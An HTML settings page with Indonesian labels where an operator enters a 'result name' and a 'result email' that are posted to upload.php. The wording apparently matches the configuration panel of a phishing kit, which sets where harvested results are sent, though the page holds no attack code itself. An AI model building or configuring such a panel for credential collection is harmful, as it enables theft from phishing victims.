<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Setting</title>
    <style>
        body {
            font-family: 'Arial', sans-serif;
            background-color: #1a1a1a;
            margin: 0;
            padding: 0;
            color: #fff;
            text-align: center;
            padding: 50px;
        }

        .container {
            max-width: 400px;
            margin: auto;
            background-color: #333;
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
        }

        label {
            display: block;
            margin-bottom: 10px;
            color: #fff;
        }

        input {
            width: 100%;
            padding: 10px;
            margin-bottom: 20px;
            box-sizing: border-box;
        }

        button {
            background-color: #3498db;
            color: #fff;
            padding: 10px 15px;
            border: none;
            cursor: pointer;
            border-radius: 5px;
        }

        button:hover {
            background-color: #2980b9;
        }
    </style>
</head>
<body>

<div class="container">
    <h2>𝗦𝗲𝘁𝘁𝗶𝗻𝗴 𝗘𝗺𝗮𝗶𝗹 𝗗𝗮𝗻 𝗥𝗲𝘀𝘂𝗹𝘁</h2>
    <form action="upload.php" method="post">
        <label for="nama-res">𝗡𝗮𝗺𝗮 𝗥𝗲𝘀𝘂𝗹𝘁:</label>
        <input type="text" id="nama-res" name="nama-res" placeholder="Contoh : WEB CAHYO SR II" required>

        <label for="email-res">𝗘𝗺𝗮𝗶𝗹 𝗥𝗲𝘀𝘂𝗹𝘁:</label>
        <input type="text" id="email-res" name="email-res" placeholder="Contoh : emailmu@gmail.com" required>

        <button type="submit">Submit</button>
    </form>
</div>

</body>
</html>
